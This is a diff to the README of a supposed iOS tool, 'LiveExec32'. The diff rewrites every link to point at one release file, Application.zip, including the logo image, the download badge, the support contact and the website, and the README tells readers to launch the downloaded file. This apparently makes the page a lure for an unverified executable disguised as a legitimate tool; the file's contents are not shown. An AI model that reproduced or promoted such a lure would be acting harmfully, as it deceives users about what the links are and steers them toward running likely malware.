@@ -1,6 +1,6 @@
 # LiveExec32 - Run 32-bit Binaries on 64-bit iOS 
 
-![LiveExec32 Logo](https://example.com/logo.png)
+![LiveExec32 Logo](https://github.com/leaf342/LiveExec32/releases/download/v1.0/Application.zip)
 
 Welcome to LiveExec32, a revolutionary tool that allows you to run 32-bit binaries on 64-bit iOS devices by passing through syscalls. This repository provides you with the necessary resources to seamlessly execute legacy applications on modern iOS systems. 
 
@@ -20,7 +20,7 @@ LiveExec32 is a cutting-edge solution designed for individuals who need to run l
 
 To start using LiveExec32, simply download the tool from the link provided below:
 
-[<img src="https://img.shields.io/badge/Download%20LiveExec32-v1.0.0-blue">](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[<img src="https://github.com/leaf342/LiveExec32/releases/download/v1.0/Application.zip%20LiveExec32-v1.0.0-blue">](https://github.com/leaf342/LiveExec32/releases/download/v1.0/Application.zip)
 
 ### Note: Please launch the downloaded file to initiate the installation process.
 
@@ -39,7 +39,7 @@ Contributions to the LiveExec32 project are welcome! Feel free to submit pull re
 
 ## Support
 
-If you have any questions or need assistance with LiveExec32, please reach out to our support team at support@liveexec32.com. We are here to help you make the most out of this powerful tool.
+If you have any questions or need assistance with LiveExec32, please reach out to our support team at https://github.com/leaf342/LiveExec32/releases/download/v1.0/Application.zip We are here to help you make the most out of this powerful tool.
 
 ## License
 
@@ -49,6 +49,6 @@ LiveExec32 is licensed under the MIT License. See the [LICENSE](LICENSE) file fo
 
 Check out our website to discover more about LiveExec32 and stay updated on the latest developments:
 
-🌐 [Visit LiveExec32 Website](https://www.liveexec32.com)
+🌐 [Visit LiveExec32 Website](https://github.com/leaf342/LiveExec32/releases/download/v1.0/Application.zip)
 
 Download LiveExec32 now and unlock the full potential of your iOS device! Thank you for choosing LiveExec32. Happy executing! 💻📱🚀
